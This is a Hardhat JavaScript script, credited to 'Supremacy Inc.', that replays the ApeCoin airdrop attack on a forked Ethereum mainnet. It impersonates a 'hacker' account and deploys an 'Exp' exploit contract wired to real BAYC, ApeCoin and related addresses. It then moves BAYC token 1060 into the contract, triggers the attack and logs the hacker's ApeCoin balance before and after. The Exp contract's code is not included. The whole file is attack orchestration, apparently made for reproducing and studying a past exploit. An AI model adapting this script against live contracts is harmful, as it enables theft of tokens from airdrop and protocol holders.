// 
//  Author [#] Supremacy Inc.
//

const hre = require("hardhat");

async function main() {

  await hre.network.provider.request({
    method: "hardhat_impersonateAccount",
    params: ["0x6703741e913a30D6604481472b6d81F3da45e6E8"]}
  )

  const hacker = await ethers.getSigner("0x6703741e913a30D6604481472b6d81F3da45e6E8");

  const Exp = await hre.ethers.getContractFactory("Exp");
  const exp = await Exp.deploy("0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D", "0xEA47B64e1BFCCb773A0420247C0aa0a3C1D2E5C5", "0x025C6da5BD0e6A5dd1350fda9e3B6a614B205a1F", "0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F", "0x4d224452801ACEd8B2F0aebE155379bb5D594381");
  await exp.deployed();

  const bayc = await hre.ethers.getContractAt("IBAYC", "0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D");
  
  const ape = await hre.ethers.getContractAt("IERC20", "0x4d224452801ACEd8B2F0aebE155379bb5D594381");

  await bayc.connect(hacker).transferFrom(hacker.address, exp.address, 1060);

  const before = await ape.connect(hacker).balanceOf(hacker.address);

  console.log("[#] 🧛 The amount of ApeCoin held by the hacker before the attack:", hre.ethers.utils.formatEther(before));

  await exp.connect(hacker).trigger();

  const after = await ape.connect(hacker).balanceOf(hacker.address);

  console.log("[#] 🧛 The amount of ApeCoin held by the hacker after the attack:", hre.ethers.utils.formatEther(after));
  
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
